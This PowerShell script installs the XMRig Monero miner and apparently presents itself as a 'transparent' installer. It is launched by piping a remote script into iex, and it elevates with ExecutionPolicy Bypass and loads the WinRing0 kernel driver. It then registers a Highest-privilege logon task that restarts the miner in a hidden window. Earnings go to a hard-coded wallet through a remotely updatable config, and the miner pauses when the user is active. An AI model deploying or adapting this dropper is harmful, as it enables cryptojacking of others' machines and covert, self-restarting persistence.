# XMRig Transparent Installer
# Downloads XMRig, verifies its SHA256, installs it under the invoking user's
# %LOCALAPPDATA%, registers a per-user scheduled task that runs it at logon
# (mutex-guarded, auto-restarting with backoff), and starts it once.
#
# Design goals:
#   - Transparent:  honest UAC prompt, visible console output at every step.
#   - Verified:     downloaded xmrig.exe + WinRing0x64.sys are hash-checked
#                   against known-good values before anything is executed.
#   - Per-user:     installs to %LOCALAPPDATA%\Programs\XMRig; no system paths.
#   - Robust:       Global mutex spans sessions; abandoned mutex is recovered.
#                   Argument arrays (not strings) survive spaces / apostrophes /
#                   unicode in usernames and paths. Azure AD / MSA identities
#                   are handled via SID, not DOMAIN\name.
#   - Self-healing: restart loop with exponential backoff so a persistently
#                   crashing miner does not tight-loop and generate log noise.
#   - No extra files on disk beyond xmrig.exe, config.json, uninstall.ps1
#     (plus the WinRing0x64 driver from the upstream archive).
#
# Usage:
#   irm https://raw.githubusercontent.com/Vicistar-V/xmrig/main/install_clean.ps1 | iex

param(
    [string]$OrigUserSid      = $null,
    [string]$OrigLocalAppData = $null
)

$ErrorActionPreference = "Stop"
$ProgressPreference    = "SilentlyContinue"

# ---------------------------------------------------------------------------
# TLS 1.2 — GitHub requires it. PS 5.1 on stock Win10 defaults to 1.0/1.1.
# Set this BEFORE any web request. If setting it fails, tell the user why —
# a silent catch would surface later as a cryptic "connection closed" error.
# ---------------------------------------------------------------------------
try {
    [Net.ServicePointManager]::SecurityProtocol =
        [Net.ServicePointManager]::SecurityProtocol -bor [Net.SecurityProtocolType]::Tls12
} catch {
    Write-Host "[!] Could not enable TLS 1.2: $($_.Exception.Message)" -ForegroundColor Yellow
    Write-Host "[!] GitHub downloads may fail on this system."           -ForegroundColor Yellow
}

function Write-Step($msg) { Write-Host "[*] $msg" -ForegroundColor Cyan }
function Write-Ok  ($msg) { Write-Host "[+] $msg" -ForegroundColor Green }
function Write-Warn($msg) { Write-Host "[!] $msg" -ForegroundColor Yellow }
function Write-Err ($msg) { Write-Host "[x] $msg" -ForegroundColor Red }

# ---------------------------------------------------------------------------
# Script-URL constant — used both by `irm | iex` and by the elevation
# handoff (we re-download rather than serialize an in-memory ScriptBlock,
# because ScriptBlock.ToString() mangles here-strings and drops comments).
# ---------------------------------------------------------------------------
$ScriptUrl = "https://raw.githubusercontent.com/Vicistar-V/xmrig/main/install_clean.ps1"

# ---------------------------------------------------------------------------
# Known-good SHA256 hashes for the files we execute. These come from the
# upstream v6.21.0 release archive and are also mirrored in the repo's
# SHA256SUMS file. If either check fails, we abort — never run unverified
# code at Highest integrity.
# ---------------------------------------------------------------------------
$ExpectedHashes = @{
    "xmrig.exe"       = "e199d88569fb54346d5fa20ee7b59b2ea6f16f4ecca3ea1e1c937b11aab7b2b0"
    "WinRing0x64.sys" = "11bd2c9f9e2397c9a16e0990e4ed2cf0679498fe0fd418a3dfdac60b5c160ee5"
}

# ---------------------------------------------------------------------------
# 1. Elevation.
#    Capture the ORIGINAL user's SID (identity-provider agnostic — works for
#    local, domain, Azure AD, and Microsoft Account users) BEFORE elevating,
#    so the elevated child installs into that user's true LOCALAPPDATA and
#    registers the scheduled task under that user's identity.
# ---------------------------------------------------------------------------
$isAdmin = ([Security.Principal.WindowsPrincipal] `
            [Security.Principal.WindowsIdentity]::GetCurrent()
          ).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)

if (-not $isAdmin) {
    Write-Warn "Administrator rights required. Re-launching with UAC prompt..."

    $capturedSid          = [System.Security.Principal.WindowsIdentity]::GetCurrent().User.Value
    $capturedLocalAppData = [Environment]::GetFolderPath([Environment+SpecialFolder]::LocalApplicationData)

    # Always re-download the script rather than serializing $MyInvocation.
    # ScriptBlock.ToString() loses formatting and re-interpolates here-strings.
    $scriptPath = Join-Path $env:TEMP ("xmrig_installer_{0}.ps1" -f $PID)
    try {
        Invoke-WebRequest -Uri $ScriptUrl -OutFile $scriptPath -UseBasicParsing
    } catch {
        Write-Err "Could not download installer for elevation: $($_.Exception.Message)"
        exit 1
    }

    # Pass args as an ARRAY so PowerShell does its own quoting. Never build
    # one big string — paths with spaces or apostrophes will split.
    $childArgs = @(
        "-ExecutionPolicy","Bypass","-NoProfile","-File",$scriptPath,
        "-OrigUserSid",$capturedSid,
        "-OrigLocalAppData",$capturedLocalAppData
    )

    Start-Process -FilePath "powershell.exe" -ArgumentList $childArgs -Verb RunAs
    exit
}

# ---------------------------------------------------------------------------
# 1a. Post-elevation: validate + re-derive the untrusted parameters.
#     Anything on the command line to an elevated process is attacker-
#     controllable; a hostile caller could pass $OrigLocalAppData =
#     "C:\Windows\System32" to get us to write there.
# ---------------------------------------------------------------------------
if (-not $OrigUserSid) {
    $OrigUserSid = [System.Security.Principal.WindowsIdentity]::GetCurrent().User.Value
}

try {
    $sidObj  = New-Object System.Security.Principal.SecurityIdentifier($OrigUserSid)
    $ntAcct  = $sidObj.Translate([System.Security.Principal.NTAccount]).Value
} catch {
    Write-Err "Invalid user SID: $OrigUserSid"
    exit 1
}

# Re-derive LOCALAPPDATA from the profile registry — never trust the passed
# value. This also handles OneDrive Known-Folder-Move correctly (the registry
# always holds the *real* local path, not the OneDrive-synced redirect).
$profileKey = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProfileList\$OrigUserSid"
if (-not (Test-Path $profileKey)) {
    Write-Err "No profile registered for SID $OrigUserSid"
    exit 1
}
$profilePath = (Get-ItemProperty -Path $profileKey -Name ProfileImagePath).ProfileImagePath
$OrigLocalAppData = Join-Path $profilePath "AppData\Local"

if (-not (Test-Path $OrigLocalAppData)) {
    Write-Err "Resolved LOCALAPPDATA does not exist: $OrigLocalAppData"
    exit 1
}

# ---------------------------------------------------------------------------
# 1b. Single-instance guard for the installer. Global so concurrent invokers
#     across sessions can't race on the shared task name / temp files.
#     Recover cleanly from an abandoned mutex if a previous run crashed.
# ---------------------------------------------------------------------------
$installerMutex = $null
try {
    $installerMutex = New-Object System.Threading.Mutex($false, "Global\XMRigInstallerMutex")
    $acquired = $false
    try {
        $acquired = $installerMutex.WaitOne(0, $false)
    } catch [System.Threading.AbandonedMutexException] {
        # Previous owner died holding it — WaitOne still transferred ownership.
        $acquired = $true
    }
    if (-not $acquired) {
        Write-Warn "Another XMRig installer is already running. Exiting."
        exit
    }
} catch {
    Write-Warn "Could not acquire installer mutex: $($_.Exception.Message). Continuing."
}

try {

# ---------------------------------------------------------------------------
# 2. Configuration.
# ---------------------------------------------------------------------------
$installDir   = Join-Path $OrigLocalAppData "Programs\XMRig"
$xmrigVersion = "6.21.0"
$xmrigUrl     = "https://github.com/xmrig/xmrig/releases/download/v$xmrigVersion/xmrig-$xmrigVersion-gcc-win64.zip"
# Unique per-PID temp paths so parallel installers (different admins) don't
# clobber each other's downloads/extracts.
$xmrigZip     = Join-Path $env:TEMP "xmrig-$xmrigVersion-$PID.zip"
$extractDir   = Join-Path $env:TEMP "xmrig-$xmrigVersion-$PID-extract"
$configUrl    = "https://raw.githubusercontent.com/Vicistar-V/xmrig/main/config.json"
$taskName     = "XMRig Miner"
$taskDesc     = "Runs the XMRig Monero miner at user logon."
$rigId        = $env:COMPUTERNAME

Write-Host ""
Write-Host "=== XMRig Transparent Installer ===" -ForegroundColor White
Write-Host "User (target)     : $ntAcct"
Write-Host "User SID          : $OrigUserSid"
Write-Host "Install directory : $installDir"
Write-Host "XMRig version     : $xmrigVersion"
Write-Host "Scheduled task    : $taskName"
Write-Host "Rig ID            : $rigId"
Write-Host ""

# ---------------------------------------------------------------------------
# 3. Prepare install directory.
# ---------------------------------------------------------------------------
Write-Step "Preparing install directory"
if (-not (Test-Path $installDir)) {
    New-Item -ItemType Directory -Path $installDir -Force | Out-Null
}
Write-Ok  "Ready: $installDir"

# ---------------------------------------------------------------------------
# 4. Stop any existing miner + launcher + task so we can update cleanly.
#    Killing xmrig.exe alone leaves the launcher powershell alive and it
#    will restart xmrig after 30s — right on top of our upgrade. Kill the
#    launcher first, then xmrig, then the task.
# ---------------------------------------------------------------------------
Write-Step "Stopping any existing XMRig launcher / miner"

# Launcher = powershell.exe whose command line references our mutex name.
Get-CimInstance Win32_Process -Filter "Name = 'powershell.exe'" -ErrorAction SilentlyContinue |
    Where-Object { $_.CommandLine -and $_.CommandLine -like "*XMRigMinerMutex*" } |
    ForEach-Object {
        try {
            Stop-Process -Id $_.ProcessId -Force -ErrorAction SilentlyContinue
            Write-Ok "Stopped launcher PID $($_.ProcessId)"
        } catch {}
    }

Get-Process -Name "xmrig" -ErrorAction SilentlyContinue | ForEach-Object {
    try { $_ | Stop-Process -Force; Write-Ok "Stopped xmrig PID $($_.Id)" } catch {}
}

# Brief pause so filesystem handles drain before we overwrite files.
Start-Sleep -Milliseconds 750

$existingTask = Get-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue
if ($existingTask) {
    Unregister-ScheduledTask -TaskName $taskName -Confirm:$false
    Write-Ok "Removed previous scheduled task"
}

# ---------------------------------------------------------------------------
# 5. Download XMRig + verify SHA256. Re-download if the on-disk copy doesn't
#    match the expected hash (handles Defender quarantine, partial writes,
#    version drift).
# ---------------------------------------------------------------------------
function Get-Sha256 {
    param([string]$Path)
    (Get-FileHash -Path $Path -Algorithm SHA256).Hash.ToLower()
}

$xmrigExe   = Join-Path $installDir "xmrig.exe"
$driverPath = Join-Path $installDir "WinRing0x64.sys"

$needDownload = $true
if (Test-Path $xmrigExe) {
    if ((Get-Sha256 $xmrigExe) -eq $ExpectedHashes["xmrig.exe"]) {
        Write-Ok "XMRig $xmrigVersion already present and hash-verified, skipping download"
        $needDownload = $false
    } else {
        Write-Warn "Existing xmrig.exe hash mismatch — re-downloading"
    }
}

if ($needDownload) {
    Write-Step "Downloading XMRig $xmrigVersion"
    try {
        Invoke-WebRequest -Uri $xmrigUrl -OutFile $xmrigZip -UseBasicParsing
    } catch {
        Write-Warn "Invoke-WebRequest failed, falling back to WebClient"
        (New-Object System.Net.WebClient).DownloadFile($xmrigUrl, $xmrigZip)
    }
    Write-Ok "Downloaded: $xmrigZip"

    Write-Step "Extracting archive"
    if (Test-Path $extractDir) { Remove-Item -Recurse -Force $extractDir }
    Expand-Archive -Path $xmrigZip -DestinationPath $extractDir -Force

    $srcRoot = Get-ChildItem -Path $extractDir -Directory | Select-Object -First 1
    if (-not $srcRoot) { throw "Extracted archive is empty." }

    Get-ChildItem -Path $srcRoot.FullName -File | ForEach-Object {
        Copy-Item -Path $_.FullName -Destination (Join-Path $installDir $_.Name) -Force
    }
    if (-not (Test-Path $xmrigExe)) { throw "xmrig.exe not found in archive." }

    # Verify the two files we actually execute / load into the kernel.
    Write-Step "Verifying SHA256 hashes"
    foreach ($fileName in $ExpectedHashes.Keys) {
        $filePath = Join-Path $installDir $fileName
        if (-not (Test-Path $filePath)) {
            if ($fileName -eq "WinRing0x64.sys") {
                Write-Warn "$fileName not present (MSR support will be unavailable)"
                continue
            }
            throw "$fileName missing after extraction."
        }
        $actual   = Get-Sha256 $filePath
        $expected = $ExpectedHashes[$fileName].ToLower()
        if ($actual -ne $expected) {
            throw "SHA256 mismatch for ${fileName}: expected $expected, got $actual"
        }
        Write-Ok "Verified: $fileName"
    }

    Write-Ok "Installed: $xmrigExe"
    Remove-Item -Path $xmrigZip   -Force          -ErrorAction SilentlyContinue
    Remove-Item -Path $extractDir -Recurse -Force -ErrorAction SilentlyContinue
}

# ---------------------------------------------------------------------------
# 6. Fetch config.json — validate JSON before writing; fall back if invalid.
#    Injecting rig-id via regex avoids the PS5.1 ConvertTo-Json round-trip
#    quirks (single-element arrays collapse to objects; null values become
#    the string "null"; keys get dropped).
# ---------------------------------------------------------------------------
$configPath = Join-Path $installDir "config.json"
Write-Step "Writing config.json"

$configContent = $null
try {
    $configContent = Invoke-WebRequest -Uri $configUrl -UseBasicParsing |
                     Select-Object -ExpandProperty Content
    $null = $configContent | ConvertFrom-Json   # validate only
    Write-Ok "Fetched and validated config from $configUrl"
} catch {
    Write-Warn "Remote config unavailable or invalid — using inline default"
    $configContent = $null
}

if (-not $configContent) {
    $logPath = (Join-Path $installDir "xmrig.log") -replace '\\','\\'
    $configContent = @"
{
    "autosave": false,
    "cpu": { "enabled": true, "huge-pages": true, "yield": true, "priority": 0 },
    "opencl": { "enabled": false },
    "cuda":   { "enabled": false },
    "donate-level": 1,
    "log-file": "$logPath",
    "pools": [
        {
            "coin": "XMR",
            "url":  "xmrpool.eu:8888",
            "user": "4AHxVmrWgk2SyHFLR9LoGxhW14fxe8cDQbKFfoyhWtavJVdUVREUP33jBkQtqSPfw4HZLAgEiA9SkbwXaXCqRMj44VuQ4n9",
            "pass": "x",
            "rig-id": "$rigId",
            "keepalive": true,
            "tls": true
        }
    ],
    "retries": 0,
    "retry-pause": 5,
    "print-time": 60,
    "watch": true,
    "pause-on-battery": true,
    "pause-on-active": true
}
"@
}

# Surgical rig-id injection — replace only the FIRST pool's rig-id whether
# it's currently null, empty, or already set. Does NOT round-trip through
# ConvertTo-Json, so it can't corrupt nulls, integer types, single-element
# arrays, or drop keys the way PS5.1's serializer does.
$rigIdEsc = $rigId -replace '\\','\\\\' -replace '"','\"'
$rx = New-Object System.Text.RegularExpressions.Regex('"rig-id"\s*:\s*(?:null|"[^"]*")')
$configContent = $rx.Replace($configContent, "`"rig-id`": `"$rigIdEsc`"", 1)

# Write UTF-8 WITHOUT BOM — PS5.1's `-Encoding UTF8` adds a BOM that some
# JSON parsers (older XMRig builds) reject.
[System.IO.File]::WriteAllText(
    $configPath,
    $configContent,
    (New-Object System.Text.UTF8Encoding($false))
)
Write-Ok "Wrote config: $configPath"

# ---------------------------------------------------------------------------
# 7. Ship uninstall.ps1 — self-elevates if needed, then stops the miner,
#    kills the launcher, removes the scheduled task, and deletes the folder.
# ---------------------------------------------------------------------------
Write-Step "Writing uninstall.ps1"
$uninstallScript = @'
# XMRig Uninstaller — stops the miner, removes the scheduled task, deletes files.
$ErrorActionPreference = "SilentlyContinue"
$taskName   = "XMRig Miner"
$installDir = $PSScriptRoot
$xmrigExe   = Join-Path $installDir "xmrig.exe"

# Self-elevate if not admin — WMI process enumeration and task removal need it.
$isAdmin = ([Security.Principal.WindowsPrincipal] `
            [Security.Principal.WindowsIdentity]::GetCurrent()
          ).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
if (-not $isAdmin) {
    Write-Host "Elevating..." -ForegroundColor Yellow
    Start-Process -FilePath "powershell.exe" `
        -ArgumentList @("-ExecutionPolicy","Bypass","-NoProfile","-File",$PSCommandPath) `
        -Verb RunAs
    exit
}

Write-Host "Stopping XMRig launcher..." -ForegroundColor Cyan
Get-CimInstance Win32_Process -Filter "Name = 'powershell.exe'" |
    Where-Object { $_.CommandLine -and $_.CommandLine -like "*XMRigMinerMutex*" } |
    ForEach-Object { Stop-Process -Id $_.ProcessId -Force }

Write-Host "Stopping XMRig miner..." -ForegroundColor Cyan
# Filter by executable path so we don't kill unrelated xmrig instances
# owned by other installs on the same machine.
Get-Process -Name "xmrig" -ErrorAction SilentlyContinue |
    Where-Object { $_.Path -eq $xmrigExe } |
    Stop-Process -Force

Write-Host "Removing scheduled task..." -ForegroundColor Cyan
Get-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue |
    Unregister-ScheduledTask -Confirm:$false

# Step out of the install dir so Windows lets us delete it, then hand the
# recursive delete to a detached cmd. 6 seconds gives Defender's real-time
# scan plenty of time to release any post-kill handle on xmrig.exe.
Set-Location $env:TEMP
Write-Host "Scheduling folder deletion..." -ForegroundColor Cyan
Start-Process -FilePath "cmd.exe" `
    -ArgumentList @("/c","timeout /t 6 /nobreak > nul & rd /s /q `"$installDir`"") `
    -WindowStyle Hidden

Write-Host "XMRig uninstalled." -ForegroundColor Green
'@
[System.IO.File]::WriteAllText(
    (Join-Path $installDir "uninstall.ps1"),
    $uninstallScript,
    (New-Object System.Text.UTF8Encoding($false))
)
Write-Ok "Wrote uninstall.ps1"

# ---------------------------------------------------------------------------
# 8. Build the inline mutex-guarded, exponentially-backing-off miner command.
#
#    - Global\ mutex so multi-user machines don't spawn N concurrent miners.
#    - AbandonedMutexException on both the constructor AND WaitOne — a prior
#      launcher killed via Task Manager leaves the mutex in an abandoned
#      state; we take over ownership cleanly instead of crashing.
#    - Exponential backoff (30s -> 60s -> ... -> 1h cap) if xmrig exits in
#      under 10s repeatedly. A pool blip resets the backoff, a persistent
#      crash slows down and stops burning CPU on restart overhead.
#    - Bounded WaitForExit so a zombie xmrig can't hold the mutex forever.
# ---------------------------------------------------------------------------
$mutexName     = "Local\XMRigMinerMutex"
$xmrigEsc      = $xmrigExe   -replace "'","''"
$installDirEsc = $installDir -replace "'","''"

$minerCmd = @"
`$name='$mutexName'; `$exe='$xmrigEsc'; `$wd='$installDirEsc';
`$c=`$false; `$m=`$null;
try {
  try { `$m=New-Object System.Threading.Mutex(`$true,`$name,[ref]`$c) }
  catch [System.Threading.AbandonedMutexException] { `$m=New-Object System.Threading.Mutex(`$true,`$name); `$c=`$true }
  if (-not `$c) { try { if (`$m) { `$acq=`$false; try { `$acq=`$m.WaitOne(0,`$false) } catch [System.Threading.AbandonedMutexException] { `$acq=`$true } ; if (-not `$acq) { exit } } } catch { exit } }
  `$backoff = 30
  while (`$true) {
    `$start = Get-Date
    try {
      `$p = Start-Process -FilePath `$exe -WorkingDirectory `$wd -PassThru -ErrorAction Stop
      if (-not `$p.WaitForExit(14400000)) { try { `$p.Kill() } catch {} }
    } catch {}
    `$elapsed = (New-TimeSpan -Start `$start -End (Get-Date)).TotalSeconds
    if (`$elapsed -lt 10) { `$backoff = [Math]::Min(`$backoff * 2, 3600) } else { `$backoff = 30 }
    Start-Sleep -Seconds `$backoff
  }
} finally {
  if (`$m) { try { `$m.ReleaseMutex() } catch {} ; try { `$m.Dispose() } catch {} }
}
"@ -replace "`r?`n"," "

# Pass -Command as its own argument in the array — powershell.exe will handle
# quoting internally. Never build one big string that has to be reparsed.
$psArgs = @(
    "-ExecutionPolicy","Bypass",
    "-NoProfile",
    "-WindowStyle","Hidden",
    "-Command",$minerCmd
)

# ---------------------------------------------------------------------------
# 9. Register the scheduled task under the ORIGINAL user's SID.
#    Using the SID (not DOMAIN\name) makes this work for local, domain,
#    Azure AD, and Microsoft-Account users identically — Task Scheduler
#    resolves the SID to the correct principal at runtime.
# ---------------------------------------------------------------------------
Write-Step "Registering scheduled task '$taskName' for '$ntAcct'"

$action    = New-ScheduledTaskAction `
                -Execute "powershell.exe" `
                -Argument ($psArgs -join " ") `
                -WorkingDirectory $installDir
$trigger   = New-ScheduledTaskTrigger   -AtLogOn -User $OrigUserSid
$principal = New-ScheduledTaskPrincipal -UserId $OrigUserSid -RunLevel Highest
$settings  = New-ScheduledTaskSettingsSet `
                -AllowStartIfOnBatteries `
                -DontStopIfGoingOnBatteries `
                -StartWhenAvailable

# NOTE: task-level RestartCount was intentionally dropped — the in-process
# while($true) loop is the sole restart mechanism. Having both fighting
# would create abandoned-mutex races when the launcher itself crashes.

Register-ScheduledTask -TaskName $taskName `
    -Action $action -Trigger $trigger -Principal $principal `
    -Settings $settings -Description $taskDesc -Force | Out-Null
Write-Ok "Scheduled task registered"

# ---------------------------------------------------------------------------
# 10. Start the miner now via the same mutex-guarded command.
#     (Runs under the elevated Admin token for this first session; next
#     logon the scheduled task takes over as $OrigUser.)
# ---------------------------------------------------------------------------
Write-Step "Starting XMRig"
Start-Process -FilePath "powershell.exe" -ArgumentList $psArgs -WorkingDirectory $installDir
Write-Ok "XMRig started"

Write-Host ""
Write-Host "=== Install complete ===" -ForegroundColor Green
Write-Host "Config    : $configPath"
Write-Host "Log file  : (set 'log-file' in config.json to enable file logging)"
Write-Host "Uninstall : powershell -ExecutionPolicy Bypass -File `"$installDir\uninstall.ps1`""
Write-Host ""
Write-Host "Note: for best RandomX hashrate, grant your account the 'Lock Pages" -ForegroundColor DarkGray
Write-Host "in Memory' privilege (secpol.msc -> Local Policies -> User Rights"   -ForegroundColor DarkGray
Write-Host "Assignment) and log out/in. Otherwise huge-pages falls back to"      -ForegroundColor DarkGray
Write-Host "normal pages and loses ~10-20% hashrate."                            -ForegroundColor DarkGray
Write-Host ""

} finally {
    if ($installerMutex) {
        try { $installerMutex.ReleaseMutex() } catch {}
        try { $installerMutex.Dispose() }     catch {}
    }
}
